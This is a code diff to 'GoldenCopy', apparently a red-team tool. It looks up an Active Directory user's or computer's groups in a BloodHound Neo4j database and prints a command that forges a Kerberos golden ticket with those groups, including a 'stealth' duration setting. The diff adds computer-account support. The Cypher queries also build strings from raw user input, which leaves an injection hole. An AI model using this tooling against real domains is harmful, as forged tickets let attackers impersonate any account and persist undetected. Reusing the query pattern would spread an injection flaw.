@@ -5,7 +5,7 @@ import re
 
 from py2neo import Graph
 
-version = '1.1'
+version = '1.2'
 
 
 def args_parser():
@@ -74,6 +74,10 @@ class User:
         self.sidhistory = user[3]
 
 
+class Computer(User):
+    pass
+
+
 class Group:
     # Data class from neo4j returned Group object to python object
     def __init__(self, group):
@@ -85,6 +89,11 @@ class Group:
 
 
 def findUser(g):
+    if args.target_user.lower().endswith("$"):
+        args.target_user = args.target_user[:-1]
+        object_type = "Computer"
+    else:
+        object_type = "User"
     if args.target_user.lower().startswith("s-1-5-21-"):
         # SID mode
         logger.debug("Search user in SID mode")
@@ -94,31 +103,33 @@ def findUser(g):
         # Classic username mode
         context = "name"
         match_test = f'(?i).*{args.target_user}.*'
-    req = g.run(f"""MATCH (u:User) 
+    req = g.run(f"""MATCH (u:{object_type}) 
     WHERE u.{context} =~ '{match_test}'
     RETURN u.name, u.domain, u.objectid, u.sidhistory
     ORDER BY u.enabled DESC,u.name""").to_table()
     user_count = len(req)
     if user_count == 0:
-        logger.critical("No user found !")
+        logger.critical(f"No {object_type.lower()} found !")
         exit(0)
     elif user_count > 1:
-        logger.warning("Multiple user found, please choose one")
+        logger.warning(f"Multiple {object_type.lower()} found, please choose one")
         # TODO multiple users found
         logger.warning(req)
         logger.warning(f"Using {req[0][0]}")
+    if object_type == "User":
         return User(req[0])
     else:
-        return User(req[0])
+        return Computer(req[0])
 
 
-def findGroupFromUser(g, user):
-    req = g.run(f"""MATCH (m:User 
-    {{objectid: "{user.object_id}"}}), (n:Group), p=(m)-[:MemberOf]->(n) 
+def findGroupFromObj(g, obj):
+    obj_type = "Computer" if type(obj) is Computer else "User"
+    req = g.run(f"""MATCH (m:{obj_type} 
+    {{objectid: "{obj.object_id}"}}), (n:Group), p=(m)-[:MemberOf]->(n) 
     RETURN n.name, n.domain, n.objectid""")
     data = req.to_table()
     group_count = len(data)
-    logger.info(f"{group_count} group found for {user.fulluser} !")
+    logger.info(f"{group_count} group found for {obj.fulluser} !")
     groups = [Group(x) for x in data]
     return groups
 
@@ -211,7 +222,7 @@ def goldenTicketer(user, groups):
                        "(stealth require 10 hours tickets)")
         cmd += f"-duration 10 "
     cmd += user.username
-    cmd += f"\nexport KRB5CCNAME=$(pwd)/{user.username}.ccache"
+    cmd += f" && export KRB5CCNAME=$(pwd)/{user.username}.ccache"
     print(cmd)
     print()
     return cmd
@@ -245,7 +256,7 @@ def main():
     logger.warning(f"GoldenCopy v{version}")
     g = getNeo4jConnection()
     user = findUser(g)
-    groups = findGroupFromUser(g, user)
+    groups = findGroupFromObj(g, user)
     forgeTicket(user, groups)
 
 
